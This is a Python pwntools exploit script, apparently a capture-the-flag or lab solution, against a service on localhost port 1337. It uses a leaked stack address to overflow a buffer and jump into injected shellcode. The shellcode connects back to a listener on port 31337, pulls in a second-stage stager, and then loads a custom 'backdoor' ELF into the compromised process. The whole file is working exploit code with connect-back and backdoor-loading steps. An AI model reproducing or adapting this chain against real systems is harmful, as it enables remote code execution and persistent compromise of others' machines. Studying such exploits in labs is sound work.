#!/usr/bin/env python3

from pwn import *
import os

host, port = '127.0.0.1', 1337

context.arch = 'amd64'
context.timeout = 2

log.info('Version of pwntools: ' + pwnlib.__version__)
r = remote(host, port)

r.recvuntil('stack address @ 0x')
stk = int(r.recvline(), 16)
log.info('stk @ ' + hex(stk))

l = listen(31337)
stage1 = asm(
    shellcraft.connect('127.0.0.1', 31337) +
    shellcraft.itoa('rbp') +
    shellcraft.write('rbp', 'rsp', 4) +
    shellcraft.read('rbp', stk + 48, 100) +
    shellcraft.mov('rax', stk + 48) + 'jmp rax'
)
r.send(b'@' * 40 + p64(stk+48) + stage1)
r.close()

s = l.wait_for_connection()
fd = str(s.recvuntil('@')[:-1], 'ascii')
log.info('sock fd @ ' + fd)

backdoor_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'backdoor')
stage2 = asm(shellcraft.stager(fd, 0x4000))
s.send(stage2.ljust(100, b'\x90'))

stage3 = asm(shellcraft.close(1) + shellcraft.dup2(fd, 1) + shellcraft.loader_append(open(backdoor_path, 'rb').read()))
s.send(stage3.ljust(0x4000, b'\x90'))

# pwned!
s.recvuntil('Hooray! A custom ELF is executed!\n')
log.info("Pwned!")
s.close()
